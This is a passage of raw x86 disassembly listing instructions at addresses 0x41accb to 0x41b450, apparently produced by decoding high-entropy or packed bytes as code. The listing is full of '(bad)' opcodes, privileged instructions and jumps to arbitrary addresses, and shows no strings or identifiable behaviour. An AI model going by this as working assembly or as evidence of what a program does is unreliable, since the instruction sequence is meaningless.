  41accb:	(bad)  
  41accc:	cmp    bl,BYTE PTR [ebp+0x40]
  41accf:	and    ecx,DWORD PTR [ebx]
  41acd1:	pop    ss
  41acd2:	adc    eax,DWORD PTR [ecx+0x2]
  41acd5:	inc    eax
  41acd6:	xchg   BYTE PTR [ebp-0x22bc5c40],cl
  41acdc:	cmp    DWORD PTR es:[edx],eax
  41acdf:	cwde   
  41ace0:	shl    BYTE PTR [eax-0x3bad3893],1
  41ace6:	into   
  41ace7:	ret    0xc67f
  41acea:	push   cs
  41aceb:	ss je  0x41ad1a
  41acee:	xchg   esp,eax
  41acef:	mov    ch,BYTE PTR [bp+di-0x13d0]
  41acf4:	sbb    BYTE PTR [ebx+0x7f16a245],al
  41acfa:	js     0x41ad1b
  41acfc:	fisttp QWORD PTR ds:0x5ea6793e
  41ad02:	jb     0x41acbc
  41ad04:	jecxz  0x41ac97
  41ad06:	push   ebp
  41ad07:	(bad)  
  41ad09:	mov    ds:0x5b20c0bf,eax
  41ad0e:	sub    al,0xd3
  41ad10:	data16 cmc 
  41ad12:	data16 ins BYTE PTR es:[edi],dx
  41ad14:	mov    eax,ds:0x20ccef01
  41ad19:	mov    ah,0xc4
  41ad1b:	adc    eax,DWORD PTR [edi+0x3f]
  41ad1e:	ret    
  41ad1f:	inc    edi
  41ad20:	test   eax,0x21d5b1b9
  41ad25:	or     edi,edx
  41ad27:	xor    al,0xff
  41ad29:	pusha  
  41ad2a:	inc    edi
  41ad2b:	pop    ebp
  41ad2c:	xchg   DWORD PTR [ebp+0x7a],edx
  41ad2f:	xor    esp,ecx
  41ad31:	cmp    al,0xa6
  41ad33:	inc    ebp
  41ad34:	and    ecx,edi
  41ad36:	pop    ds
  41ad37:	jl     0x41ad46
  41ad39:	imul   esi,DWORD PTR [ebx],0xffffff97
  41ad3c:	and    DWORD PTR [ebx+edx*1+0x7f],edx
  41ad40:	adc    esi,DWORD PTR [esi]
  41ad42:	fdiv   st(0),st
  41ad44:	inc    eax
  41ad45:	aad    0xb4
  41ad47:	cmp    al,0x48
  41ad49:	inc    edx
  41ad4a:	repnz test BYTE PTR [esp+ecx*2+0x91e1eb6],bh
  41ad52:	je     0x41acec
  41ad54:	sbb    dl,dh
  41ad56:	stc    
  41ad57:	fadd   st(7),st
  41ad59:	popa   
  41ad5a:	stc    
  41ad5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad5c:	mov    ah,0xf9
  41ad5e:	ret    
  41ad5f:	or     edx,DWORD PTR [ebx+0x5984011]
  41ad65:	sar    al,1
  41ad67:	add    eax,0xfc1e999f
  41ad6c:	call   0x5610d128
  41ad71:	fild   WORD PTR [ebx]
  41ad73:	jmp    0x1fac2ed9
  41ad78:	mov    bh,0x42
  41ad7a:	mov    cl,0xf8
  41ad7c:	jns    0x41ad63
  41ad7e:	mov    ebp,0x41889e06
  41ad83:	cmp    BYTE PTR [edi],0x0
  41ad86:	and    eax,0x585ecafa
  41ad8b:	and    BYTE PTR [ebx+0x50],ch
  41ad8e:	(bad)  
  41ad8f:	jge    0x41ad51
  41ad91:	and    ah,BYTE PTR [ebx]
  41ad93:	mov    dh,0xfe
  41ad95:	enter  0x1d92,0x96
  41ad99:	ror    DWORD PTR [edi],0x30
  41ad9c:	fist   WORD PTR [edx+0x3f]
  41ad9f:	(bad)  
  41ada0:	adc    dl,BYTE PTR [esi+0x8]
  41ada3:	or     edi,DWORD PTR [edi+0x48]
  41ada6:	ficomp WORD PTR [edi+0x5f]
  41ada9:	sbb    eax,0x2f819f9
  41adae:	jmp    0xc9baddbb
  41adb3:	mov    BYTE PTR [edx+edi*4-0x11],bl
  41adb7:	pop    ecx
  41adb8:	dec    esi
  41adb9:	adc    ebp,edi
  41adbb:	push   cs
  41adbc:	(bad)  
  41adbd:	add    eax,DWORD PTR [edi+0x5d]
  41adc0:	mov    ebp,0x7ade1bfc
  41adc5:	pop    ds
  41adc6:	xchg   cl,ch
  41adc8:	mov    eax,0x14a473f0
  41adcd:	stos   DWORD PTR es:[edi],eax
  41adce:	xor    eax,0xf02cc09b
  41add3:	pop    esi
  41add4:	xchg   BYTE PTR [ecx+0x1b],al
  41add7:	and    ah,ch
  41add9:	pop    es
  41adda:	adc    BYTE PTR [ecx+0xb30ee4f],dh
  41ade0:	mov    ebp,0x79aa7fb
  41ade5:	mov    edi,0x9e2fbca8
  41adea:	call   0xf09b:0xd5973cb7
  41adf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf2:	loopne 0x41ae61
  41adf4:	fidiv  WORD PTR [esi]
  41adf6:	adc    ah,ch
  41adf8:	bnd jg 0x41ada5
  41adfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adfc:	and    eax,0x466e0e47
  41ae01:	enter  0xbb00,0x83
  41ae05:	xor    BYTE PTR [esi-0x3482ba47],al
  41ae0b:	pop    edi
  41ae0c:	pop    ebx
  41ae0d:	cli    
  41ae0e:	pop    es
  41ae0f:	xchg   esp,eax
  41ae10:	sub    BYTE PTR [ecx-0x4b],cl
  41ae13:	hlt    
  41ae14:	inc    eax
  41ae15:	(bad)  
  41ae16:	in     al,dx
  41ae17:	fwait
  41ae18:	cmp    DWORD PTR [esi],0xffffffd4
  41ae1b:	adc    dl,BYTE PTR gs:[edi+0x4313a7a6]
  41ae22:	push   edi
  41ae23:	pop    esi
  41ae24:	mov    eax,es
  41ae26:	jmp    0x41aea2
  41ae28:	aaa    
  41ae29:	add    DWORD PTR [ebp-0x5d],0x63
  41ae2d:	imul   edi,DWORD PTR [edx-0x6ebdec38],0x73af366d
  41ae37:	pop    ss
  41ae38:	adc    eax,0xdf66373f
  41ae3d:	mov    bl,0xc2
  41ae3f:	cmp    eax,0xa4f0819e
  41ae44:	sub    al,0x3b
  41ae46:	jae    0x41ae16
  41ae48:	xor    edi,edi
  41ae4a:	and    al,0x5c
  41ae4c:	arpl   WORD PTR [edi-0x2aacba9d],cx
  41ae52:	xor    eax,DWORD PTR [ecx+esi*4-0xdc0ee2d]
  41ae59:	mov    cl,0x5e
  41ae5b:	dec    edx
  41ae5c:	dec    ecx
  41ae5d:	pop    ds
  41ae5e:	inc    ebx
  41ae5f:	ins    BYTE PTR es:[edi],dx
  41ae60:	push   ebp
  41ae61:	addr16 pop esi
  41ae63:	jbe    0x41aee3
  41ae65:	sar    BYTE PTR [esi+0x67eb5daf],cl
  41ae6b:	cwde   
  41ae6c:	and    eax,0xc67745fa
  41ae71:	ret    
  41ae72:	adc    DWORD PTR [ebp+0x36198e8f],eax
  41ae78:	adc    DWORD PTR [edi+0x5],eax
  41ae7b:	mov    ecx,0x4cddba55
  41ae80:	leave  
  41ae81:	push   esp
  41ae82:	or     al,0x37
  41ae84:	adc    al,0x83
  41ae86:	lock fadd DWORD PTR [edx+0x42aedfd8]
  41ae8d:	sbb    al,0x7b
  41ae8f:	xlat   BYTE PTR ds:[ebx]
  41ae90:	adc    BYTE PTR [ecx+0x77],0xf1
  41ae94:	(bad)  
  41ae95:	addr16 icebp 
  41ae97:	adc    BYTE PTR [ebx-0x5e5da57],al
  41ae9d:	and    BYTE PTR [edx+0x3e81c4d2],0x9
  41aea4:	dec    edi
  41aea5:	jno    0x41ae38
  41aea7:	fbld   TBYTE PTR [ebx+edi*1]
  41aeaa:	jmp    0x16c7:0x1b12ae34
  41aeb1:	les    eax,FWORD PTR [ecx-0x39]
  41aeb4:	retf   
  41aeb5:	je     0x41aeef
  41aeb7:	sti    
  41aeb8:	mov    ss,WORD PTR [edi+0x48]
  41aebb:	frstor [ecx*1-0x34d6870a]
  41aec2:	sar    BYTE PTR [ebx+ecx*2-0xe0139a5],cl
  41aec9:	push   bp
  41aecb:	jge    0x41af28
  41aecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aece:	data16 jg 0x41aec5
  41aed1:	fwait
  41aed2:	xor    dh,BYTE PTR [esi-0x71ff23c8]
  41aed8:	xchg   edx,eax
  41aed9:	fld    QWORD PTR [ecx+ecx*2]
  41aedc:	and    eax,0x4691b5ff
  41aee1:	nop
  41aee2:	shl    DWORD PTR [eax+0x3ec8c184],0x10
  41aee9:	cmp    eax,0x5f34d14a
  41aeee:	push   edx
  41aeef:	pop    esi
  41aef0:	inc    ebp
  41aef1:	push   ss
  41aef2:	sub    al,0x87
  41aef4:	mov    edx,0x9ba3fb8c
  41aef9:	and    BYTE PTR [edx],0x1f
  41aefc:	stc    
  41aefd:	dec    edi
  41aefe:	inc    edx
  41aeff:	and    al,0x97
  41af01:	push   esp
  41af02:	xlat   BYTE PTR ds:[ebx]
  41af03:	and    eax,0xccb75930
  41af08:	cmp    eax,edi
  41af0a:	mov    al,0xc3
  41af0c:	jbe    0x41af0b
  41af0e:	xchg   esp,eax
  41af0f:	inc    ebp
  41af10:	xchg   eax,ebx
  41af12:	call   0x9bf1d25b
  41af17:	imul   esp,ebx,0x11
  41af1a:	sub    DWORD PTR [ebp-0x7f],ecx
  41af1d:	imul   eax,DWORD PTR [edi],0x363aec4d
  41af23:	add    DWORD PTR [edx+0xddddd65],esi
  41af29:	loopne 0x41afaa
  41af2b:	xchg   edi,eax
  41af2c:	adc    DWORD PTR [ecx+0x30],0x3d
  41af30:	xchg   edx,eax
  41af31:	sbb    ecx,DWORD PTR gs:[edi+0x43cd8364]
  41af38:	in     al,0x4f
  41af3a:	les    edi,FWORD PTR [ebp+0x2cf0fecd]
  41af40:	ins    BYTE PTR es:[edi],dx
  41af41:	test   eax,0xb453ff82
  41af46:	lods   eax,DWORD PTR ds:[esi]
  41af47:	retf   
  41af48:	push   es
  41af49:	in     eax,0xfb
  41af4b:	das    
  41af4c:	sbb    BYTE PTR [edi+0x73d11604],bh
  41af52:	add    BYTE PTR [esp+esi*8-0x31],al
  41af56:	shr    DWORD PTR [ebx],0x2a
  41af59:	mov    ebx,0xbef75a7a
  41af5e:	add    al,0xd8
  41af60:	jo     0x41af67
  41af62:	xchg   esp,eax
  41af63:	retf   
  41af64:	fldcw  WORD PTR [edi+0x5bc5ed79]
  41af6a:	inc    si
  41af6c:	dec    ebx
  41af6d:	dec    ebp
  41af6e:	fstp   QWORD PTR [edi]
  41af70:	push   ss
  41af71:	mov    dl,0xef
  41af73:	cwde   
  41af74:	push   es
  41af75:	loope  0x41afd4
  41af77:	lar    esp,WORD PTR [edx-0x33]
  41af7b:	bound  edi,QWORD PTR [eax+0xf]
  41af7e:	in     eax,0x49
  41af80:	pop    ebx
  41af81:	into   
  41af82:	or     ecx,eax
  41af84:	mov    edx,eax
  41af86:	js     0x41af99
  41af88:	add    al,BYTE PTR [eax+eiz*8-0x10]
  41af8c:	xchg   esp,eax
  41af8d:	dec    esp
  41af8e:	inc    esi
  41af8f:	push   ebx
  41af90:	iret   
  41af91:	dec    esp
  41af92:	aas    
  41af93:	imul   ecx,DWORD PTR [edi],0xffffff91
  41af96:	add    eax,0xa4f5fc89
  41af9b:	mov    WORD PTR [ecx],cs
  41af9d:	or     DWORD PTR [ebp+0x859940b],ecx
  41afa3:	into   
  41afa4:	or     ch,BYTE PTR [eax+0x5f3214ec]
  41afaa:	xor    ebp,DWORD PTR [ecx+0x5737c9c2]
  41afb0:	adc    DWORD PTR [edi-0x49fc93e4],0xffffffab
  41afb7:	ret    0x8f7a
  41afba:	sub    eax,0xf15565fa
  41afbf:	scas   al,BYTE PTR es:[edi]
  41afc0:	jae    0x41afcc
  41afc2:	dec    edi
  41afc3:	xchg   BYTE PTR [edx-0x16d05e46],dl
  41afc9:	pop    eax
  41afca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afcb:	cdq    
  41afcc:	xor    al,0xc2
  41afce:	sahf   
  41afcf:	jmp    0x8305:0x40568c3
  41afd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd7:	or     cl,dl
  41afd9:	mov    esp,DWORD PTR [ecx-0x5d]
  41afdc:	test   DWORD PTR [ecx+ebp*2+0x21],esi
  41afe0:	push   ecx
  41afe1:	into   
  41afe2:	or     DWORD PTR [esp+edx*1+0x18],edi
  41afe6:	adc    al,0x56
  41afe8:	sbb    BYTE PTR [edi+0x10],bh
  41afeb:	shr    DWORD PTR [esi-0x23],cl
  41afee:	test   al,0xf4
  41aff0:	outs   dx,BYTE PTR ds:[esi]
  41aff1:	mov    edi,0x7f08ef0a
  41aff6:	leave  
  41aff7:	ret    0xbb7e
  41affa:	inc    ecx
  41affb:	ins    BYTE PTR es:[edi],dx
  41affc:	pop    esp
  41affd:	retf   
  41affe:	or     DWORD PTR [ecx+0x18b64fa8],0xffffffc1
  41b005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b006:	fdivr  DWORD PTR [edx+0x45]
  41b009:	jecxz  0x41afc1
  41b00b:	sti    
  41b00c:	cmp    al,0x91
  41b00e:	loop   0x41afe7
  41b010:	in     al,0x38
  41b012:	push   es
  41b013:	jge    0x41b03f
  41b015:	bnd jnp 0x41b03b
  41b018:	cmp    al,0x5d
  41b01a:	and    al,0xfd
  41b01c:	clc    
  41b01d:	pop    ss
  41b01e:	mov    esp,0x5738c00d
  41b023:	sti    
  41b024:	dec    esp
  41b025:	push   edi
  41b026:	pop    ss
  41b027:	(bad)  
  41b028:	aas    
  41b029:	jne    0x41b069
  41b02b:	dec    esi
  41b02c:	in     eax,dx
  41b02d:	and    eax,0xa5bfee25
  41b032:	int    0x3a
  41b034:	aad    0x5f
  41b036:	xor    eax,0x61159367
  41b03b:	or     edi,DWORD PTR ss:[ebp-0x36694a61]
  41b042:	mov    WORD PTR [edi-0x3b00874f],es
  41b048:	lahf   
  41b049:	xchg   esp,eax
  41b04a:	fstp   DWORD PTR [ebp-0x7f16c270]
  41b050:	sti    
  41b051:	fimul  DWORD PTR gs:[esi+0x4606638b]
  41b058:	fs ins BYTE PTR es:[edi],dx
  41b05a:	add    ebp,DWORD PTR [ecx+0x147ec25a]
  41b060:	mov    edi,0x6bfcde6a
  41b065:	hlt    
  41b066:	fbld   TBYTE PTR ds:0xf3b89d41
  41b06c:	in     eax,0xc
  41b06e:	jecxz  0x41b009
  41b070:	inc    esi
  41b071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b072:	mov    dl,0x46
  41b074:	mov    al,0xa
  41b076:	mov    dl,0x19
  41b078:	shl    BYTE PTR [edi-0x45],0x8e
  41b07c:	ret    0x39aa
  41b07f:	xor    BYTE PTR [edx+ebp*4+0x41],al
  41b083:	xchg   ebx,eax
  41b084:	and    BYTE PTR [edx-0xb9767cd],ah
  41b08a:	adc    ebx,DWORD PTR [ebx-0x6720cff9]
  41b090:	ret    
  41b091:	jbe    0x41b0e5
  41b093:	pop    edx
  41b094:	add    al,BYTE PTR [edx+edi*2-0xf]
  41b098:	pop    esi
  41b099:	or     esi,0xffffffc0
  41b09c:	pushf  
  41b09d:	aam    0xa3
  41b09f:	dec    edi
  41b0a0:	leave  
  41b0a1:	loop   0x41b061
  41b0a3:	popa   
  41b0a4:	pop    eax
  41b0a5:	ret    
  41b0a6:	ret    0x344d
  41b0a9:	sbb    DWORD PTR [edx-0x2f951bbd],edi
  41b0af:	pop    edi
  41b0b0:	add    dh,BYTE PTR [edx-0x5e663e98]
  41b0b6:	inc    edi
  41b0b7:	push   ds
  41b0b8:	mov    al,0x98
  41b0ba:	shl    DWORD PTR gs:[edx+ecx*4+0x3b],0x66
  41b0c0:	and    eax,0xac34277
  41b0c5:	sahf   
  41b0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0c7:	leave  
  41b0c8:	mov    ebp,0x13270d64
  41b0cd:	addr16 push ss
  41b0cf:	mov    ebp,0x176e38b1
  41b0d4:	clc    
  41b0d5:	xor    DWORD PTR [edx-0xaa28b26],eax
  41b0db:	mov    ah,0xc6
  41b0dd:	jge    0x41b078
  41b0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0e0:	xor    DWORD PTR [ecx-0x10],edi
  41b0e3:	nop
  41b0e4:	test   DWORD PTR [eax],ebp
  41b0e6:	gs pop ebx
  41b0e8:	or     eax,0xfcded876
  41b0ed:	call   0xd143:0x1cb6d01d
  41b0f4:	pop    es
  41b0f5:	mov    ecx,0xa9d163fa
  41b0fa:	or     eax,0x4acb9168
  41b0ff:	lock push edx
  41b101:	dec    ebp
  41b102:	loope  0x41b0b2
  41b104:	popa   
  41b105:	push   cs
  41b106:	in     eax,0x9d
  41b108:	mov    al,0x79
  41b10a:	jne    0x41b14c
  41b10c:	mov    cs,WORD PTR es:[ebp+ecx*4+0x7d]
  41b111:	mov    ecx,0xcea98258
  41b116:	add    cl,BYTE PTR [edi+ebp*1]
  41b119:	ret    0x8ee4
  41b11c:	hlt    
  41b11d:	adc    eax,0x66738ce6
  41b122:	sub    al,0x75
  41b124:	pop    esp
  41b125:	pop    ebx
  41b126:	ror    DWORD PTR [edi-0x1b01b9f2],1
  41b12c:	mov    edi,0xb4e07d0f
  41b131:	in     eax,0xc
  41b133:	not    BYTE PTR [edx+edi*1+0x599cc6ed]
  41b13a:	mov    ds:0x130d1e41,al
  41b13f:	ins    DWORD PTR es:[edi],dx
  41b140:	stos   DWORD PTR es:[di],eax
  41b142:	icebp  
  41b143:	cmp    esp,esp
  41b145:	xor    eax,0x5673c089
  41b14a:	or     al,0xc0
  41b14c:	add    BYTE PTR [eax+0xf],dl
  41b14f:	jnp    0x41b15b
  41b151:	cli    
  41b152:	pushf  
  41b153:	and    BYTE PTR ds:[bx+di-0x142b],dl
  41b159:	xchg   edi,eax
  41b15a:	jmp    0xd894:0x1a0b36b9
  41b161:	ja     0x41b11c
  41b163:	pop    esi
  41b164:	push   ebx
  41b165:	sti    
  41b166:	xor    ah,BYTE PTR [edx+0x31c08305]
  41b16c:	sub    ecx,DWORD PTR [ebx-0x22]
  41b16f:	outs   dx,BYTE PTR ds:[esi]
  41b170:	or     al,0xc0
  41b172:	push   ecx
  41b173:	in     al,dx
  41b174:	mov    bl,0x29
  41b176:	mov    ah,0xfa
  41b178:	sar    edx,1
  41b17a:	push   ds
  41b17b:	loop   0x41b129
  41b17d:	cmp    ebp,DWORD PTR [ebx-0x181f7955]
  41b183:	imul   ecx,ebx,0xfffffff3
  41b186:	ss push 0xffffffea
  41b189:	ret    0x72db
  41b18c:	add    ebx,DWORD PTR [eax+esi*1+0x16]
  41b190:	lods   al,BYTE PTR ds:[esi]
  41b191:	and    al,dh
  41b193:	xchg   esp,eax
  41b194:	lock xor DWORD PTR [edi-0x140b34f2],ebx
  41b19b:	adc    DWORD PTR [ebx],esi
  41b19d:	fcom   DWORD PTR [edi-0x687fc99b]
  41b1a3:	nop
  41b1a4:	jo     0x41b188
  41b1a6:	jae    0x41b18c
  41b1a8:	push   es
  41b1a9:	mov    bh,0xe5
  41b1ab:	std    
  41b1ac:	and    ebp,DWORD PTR [ebx+0x48]
  41b1af:	test   eax,0xabbcae52
  41b1b4:	add    edx,DWORD PTR [ecx+0xaa9f3f2]
  41b1ba:	push   0xdfcdd27a
  41b1bf:	or     DWORD PTR [bp+si-0x4cd3],eax
  41b1c4:	sbb    al,BYTE PTR [esi+0x4fd189e2]
  41b1ca:	xchg   esp,eax
  41b1cb:	ror    DWORD PTR [ecx-0x6a],0xeb
  41b1cf:	in     eax,0x8c
  41b1d1:	das    
  41b1d2:	sar    BYTE PTR [ebp-0x48],1
  41b1d5:	popf   
  41b1d6:	ins    DWORD PTR es:[edi],dx
  41b1d7:	icebp  
  41b1d8:	imul   edx,DWORD PTR [eax-0x1e72d607],0xb2c832fa
  41b1e2:	or     DWORD PTR [edx+0x2416ff9a],0x6f
  41b1e9:	rcl    eax,1
  41b1eb:	in     eax,0x5f
  41b1ed:	retf   0x4eb9
  41b1f0:	rcl    bh,0x46
  41b1f3:	or     bl,dh
  41b1f5:	sbb    eax,0x658dfde3
  41b1fa:	push   ebx
  41b1fb:	ret    0x1236
  41b1fe:	bound  edx,QWORD PTR [ecx+0x77]
  41b201:	pop    esp
  41b202:	mov    ebp,DWORD PTR [ebx+0x32]
  41b205:	adc    al,0x62
  41b207:	test   DWORD PTR [ebp+0x3e90699c],ebp
  41b20d:	cmp    DWORD PTR [esp+eiz*8],ecx
  41b210:	(bad)  
  41b211:	cmp    ebp,DWORD PTR [edi+0x30]
  41b214:	or     al,0x33
  41b216:	popf   
  41b217:	mov    edx,0x4d873b8
  41b21c:	cmp    DWORD PTR [edx-0x1eb22f9d],eax
  41b222:	fbstp  TBYTE PTR [ebx+0x6d]
  41b225:	bound  esp,QWORD PTR [ebp+0x41]
  41b228:	dec    ecx
  41b229:	xchg   DWORD PTR [ebp-0x294af2e4],edx
  41b22f:	(bad)  
  41b230:	repnz in eax,dx
  41b232:	daa    
  41b233:	xor    al,0x4e
  41b235:	jo     0x41b2a5
  41b237:	adc    al,0x85
  41b239:	sub    BYTE PTR [edi],0x6
  41b23c:	sbb    esi,edx
  41b23e:	aaa    
  41b23f:	push   ds
  41b240:	or     ch,cl
  41b242:	xchg   ecx,eax
  41b243:	inc    esp
  41b244:	sti    
  41b245:	outs   dx,BYTE PTR ds:[esi]
  41b246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b247:	jg     0x41b215
  41b249:	aam    0xa8
  41b24b:	(bad)  
  41b24c:	push   ds
  41b24d:	push   ebp
  41b24e:	adc    al,0x4
  41b250:	mov    edx,0x17c5d141
  41b255:	xchg   BYTE PTR [ebx-0x5e],bl
  41b258:	(bad)  
  41b259:	adc    al,0xa4
  41b25b:	mov    BYTE PTR [ebp-0x39],dh
  41b25e:	add    al,0x4c
  41b260:	or     BYTE PTR [ebp-0x5f],dl
  41b263:	(bad)  
  41b264:	mov    ebx,0x1df5dd3f
  41b269:	mov    ebx,0xc7c98dfb
  41b26e:	xor    eax,edx
  41b270:	pop    eax
  41b271:	mov    eax,0x5d4762d1
  41b276:	sbb    al,0x57
  41b278:	pop    edi
  41b279:	dec    ecx
  41b27a:	js     0x41b20e
  41b27c:	ret    0xd608
  41b27f:	push   esp
  41b280:	test   al,0xbd
  41b282:	pop    ss
  41b283:	pop    esp
  41b284:	mov    al,ds:0x72e65305
  41b289:	inc    esi
  41b28a:	lods   al,BYTE PTR ss:[esi]
  41b28c:	pop    edx
  41b28d:	js     0x41b228
  41b28f:	push   ecx
  41b290:	aad    0x65
  41b292:	fsin   
  41b294:	icebp  
  41b295:	adc    bh,BYTE PTR [ecx+0x59]
  41b298:	mov    WORD PTR [eax-0x10],fs
  41b29b:	aad    0x93
  41b29d:	mov    ebx,0xc54fa251
  41b2a2:	rcr    ah,0xf9
  41b2a5:	es inc esp
  41b2a8:	or     BYTE PTR [edi+0x43],ah
  41b2ab:	sti    
  41b2ac:	add    BYTE PTR [ebp-0x29afae5e],bh
  41b2b2:	out    dx,al
  41b2b3:	xor    eax,0xe2243f0f
  41b2b8:	xchg   ebx,eax
  41b2b9:	ja     0x41b30c
  41b2bb:	sub    ah,ch
  41b2bd:	sub    dh,BYTE PTR [ebx+0x223cfdf7]
  41b2c3:	mov    al,0x9d
  41b2c5:	adc    eax,0x85dab795
  41b2ca:	fs mov al,0xe9
  41b2cd:	fiadd  WORD PTR [esi+esi*4+0x4e0b3e76]
  41b2d4:	sbb    bl,BYTE PTR [edx-0x4e]
  41b2d7:	pop    ebx
  41b2d8:	dec    ecx
  41b2d9:	ret    
  41b2da:	out    dx,eax
  41b2db:	mov    dl,0x6d
  41b2dd:	or     edi,ecx
  41b2df:	jns    0x41b2ad
  41b2e1:	add    BYTE PTR [edi-0x4cbb5522],dh
  41b2e7:	add    bl,BYTE PTR [ebx+0x79]
  41b2ea:	repnz and eax,0xb0124b21
  41b2f0:	out    dx,al
  41b2f1:	sub    al,0xb7
  41b2f3:	sub    edi,ebx
  41b2f5:	push   esp
  41b2f6:	cdq    
  41b2f7:	xor    al,0x52
  41b2f9:	and    eax,0xf2fe3071
  41b2fe:	sub    cl,BYTE PTR [edx]
  41b300:	dec    esp
  41b301:	repnz icebp 
  41b303:	xor    esp,0x16ef078d
  41b309:	cmp    al,0x94
  41b30b:	adc    esp,DWORD PTR [edx+0x45]
  41b30e:	mov    dh,0xc
  41b310:	arpl   WORD PTR [eax+0x34f51235],ax
  41b316:	pop    ss
  41b317:	ret    
  41b318:	sub    al,0xc4
  41b31a:	dec    esi
  41b31b:	lds    eax,FWORD PTR [eax+0xf583866]
  41b321:	iret   
  41b322:	in     eax,dx
  41b323:	sub    al,bl
  41b325:	dec    esi
  41b326:	and    eax,0x21f6ac16
  41b32b:	jge    0x41b35f
  41b32d:	adc    eax,DWORD PTR [ebp+0x79]
  41b330:	mov    ebx,ecx
  41b332:	pop    edx
  41b333:	ret    0xf22b
  41b336:	pop    ebp
  41b337:	cmp    edi,DWORD PTR [eax-0x38]
  41b33a:	cld    
  41b33b:	jnp    0x41b35f
  41b33d:	scas   al,BYTE PTR es:[edi]
  41b33e:	mov    esp,0x404309c4
  41b343:	and    bh,BYTE PTR [ecx]
  41b345:	xlat   BYTE PTR ds:[ebx]
  41b346:	hlt    
  41b347:	fimul  DWORD PTR ds:0x35b8ac7f
  41b34d:	sub    eax,0x60d656b7
  41b352:	dec    esi
  41b353:	add    DWORD PTR [edi],ecx
  41b355:	mov    ds:0x9c2f24e1,al
  41b35a:	push   edi
  41b35b:	mov    al,ds:0x7923a901
  41b360:	cmp    edx,DWORD PTR [eax]
  41b362:	push   0xffffffe0
  41b364:	lahf   
  41b365:	cmp    DWORD PTR [ebx],esp
  41b367:	sbb    ah,dh
  41b369:	ins    BYTE PTR es:[edi],dx
  41b36a:	mov    ebp,0xf491503d
  41b36f:	mov    eax,ds:0xfd5aa294
  41b374:	mov    bl,0x88
  41b376:	jmp    0x41b315
  41b378:	inc    ecx
  41b379:	stos   BYTE PTR es:[edi],al
  41b37a:	outs   dx,BYTE PTR ds:[esi]
  41b37b:	inc    ecx
  41b37c:	scas   al,BYTE PTR es:[edi]
  41b37d:	cli    
  41b37e:	sar    BYTE PTR [esp+ebx*1],1
  41b381:	jno    0x41b358
  41b383:	(bad)  
  41b384:	aad    0xc1
  41b386:	or     al,0x71
  41b388:	(bad)  
  41b389:	lods   al,BYTE PTR ds:[esi]
  41b38a:	scas   al,BYTE PTR es:[edi]
  41b38b:	jmp    0x9019cd55
  41b390:	arpl   WORD PTR ds:0xebb7d004,di
  41b396:	mov    bh,0xf6
  41b398:	popf   
  41b399:	inc    ecx
  41b39a:	sahf   
  41b39b:	jl     0x41b326
  41b39d:	pop    ds
  41b39e:	jmp    0x41b38c
  41b3a0:	gs add eax,0x2b18e0da
  41b3a6:	jle    0x41b3e9
  41b3a8:	cmp    edx,DWORD PTR [esi-0x6]
  41b3ab:	rep outs dx,DWORD PTR ds:[esi]
  41b3ad:	stc    
  41b3ae:	adc    ah,BYTE PTR [ebx]
  41b3b0:	dec    eax
  41b3b1:	gs ins DWORD PTR es:[edi],dx
  41b3b3:	cmp    BYTE PTR [ebx],cl
  41b3b5:	xchg   esi,eax
  41b3b6:	fwait
  41b3b7:	cdq    
  41b3b8:	dec    esp
  41b3b9:	pop    es
  41b3ba:	and    eax,0x9384c017
  41b3bf:	pop    esi
  41b3c0:	pushf  
  41b3c1:	stc    
  41b3c2:	jmp    0x11c40720
  41b3c7:	adc    DWORD PTR [eax-0x6ad7b2b7],edi
  41b3cd:	and    eax,0xf8b7e449
  41b3d2:	add    al,0x35
  41b3d4:	add    dl,BYTE PTR [esi]
  41b3d6:	mov    ebp,0x89af2262
  41b3db:	cs push ebp
  41b3dd:	xchg   DWORD PTR [ebx],ecx
  41b3df:	push   esi
  41b3e0:	scas   eax,DWORD PTR es:[edi]
  41b3e1:	popa   
  41b3e2:	push   ebx
  41b3e3:	pop    edx
  41b3e4:	loopne 0x41b3f1
  41b3e6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e8:	aam    0x83
  41b3ea:	dec    edi
  41b3eb:	rcr    BYTE PTR ds:0xccd449a4,cl
  41b3f1:	test   BYTE PTR [ecx],al
  41b3f3:	jmp    0x41b3b4
  41b3f5:	xlat   BYTE PTR ds:[ebx]
  41b3f6:	cmp    BYTE PTR [ebx],ch
  41b3f8:	inc    esp
  41b3f9:	jnp    0x41b3bf
  41b3fb:	mov    bl,0xa0
  41b3fd:	inc    eax
  41b3fe:	bound  esp,QWORD PTR [edx-0x381f6606]
  41b404:	aad    0xa4
  41b406:	popf   
  41b407:	dec    esp
  41b408:	push   ebx
  41b409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b40a:	sbb    BYTE PTR [edi+0x3a9a1dfb],0x1d
  41b411:	xor    eax,0xc16c8817
  41b416:	in     al,dx
  41b417:	and    dl,0x84
  41b41a:	ins    BYTE PTR es:[edi],dx
  41b41b:	xor    eax,0x79974939
  41b420:	daa    
  41b421:	mov    ds:0xb2c519a5,al
  41b426:	pop    es
  41b427:	(bad)  
  41b428:	pop    ebx
  41b429:	pop    edi
  41b42a:	test   DWORD PTR [edi-0x64],edi
  41b42d:	icebp  
  41b42e:	adc    al,0x38
  41b430:	cmp    esp,DWORD PTR [edi]
  41b432:	cmp    BYTE PTR [ecx],dh
  41b434:	test   DWORD PTR [edx],0x8eb42ed
  41b43a:	pop    es
  41b43b:	cdq    
  41b43c:	jmp    0x41b418
  41b43e:	lock int3 
  41b440:	sub    eax,0xba7623d5
  41b445:	lock cwde 
  41b447:	scas   eax,DWORD PTR es:[edi]
  41b448:	mov    esp,ecx
  41b44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b44b:	mov    esi,DWORD PTR [eax+edi*2]
  41b44e:	lds    ebx,FWORD PTR [ebx]
  41b450:	fcmovne st,st(4)
